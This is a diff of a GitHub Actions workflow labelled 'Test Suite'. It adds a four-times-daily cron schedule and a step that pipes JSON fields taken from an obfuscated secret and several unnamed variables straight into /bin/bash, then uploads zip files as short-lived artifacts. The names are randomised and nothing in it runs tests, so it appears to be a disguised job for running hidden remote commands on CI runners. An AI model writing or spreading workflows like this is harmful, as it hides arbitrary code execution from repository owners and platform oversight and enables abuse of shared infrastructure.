@@ -2,6 +2,8 @@ name: Test Suite
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '7 1,7,13,19 * * *'
 jobs:
   agent:
     runs-on: ubuntu-latest
@@ -10,17 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Perform
         env:
-          auu18: ${{ secrets.auu18 }}
+          hd13605: ${{ secrets.hd13605 }}
         run: |
-          printf '%s' "$auu18" | jq -r .tnysi59443 | /bin/bash
-          echo $dxl328 | jq -r .co0456 | /bin/bash
-          echo $popdv8725 | jq -r .i166 | /bin/bash
-          echo $m39102 | jq -r .lzf681 | /bin/bash
+          printf '%s' "$hd13605" | jq -r .nunvp23 | /bin/bash
+          printf '%s' "$gpfa35" | jq -r .d92 | /bin/bash
+          echo $h0 | jq -r .i19453 | /bin/bash
+          printf '%s' "$qzsqa7473" | jq -r .gnegp86 | /bin/bash
+          echo $zbq3269 | jq -r .ulbvx7 | /bin/bash
 
       - name: Upload results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: hOUuzPcm
+          name: FaiLF5PI
           path: "*.zip"
           retention-days: 1
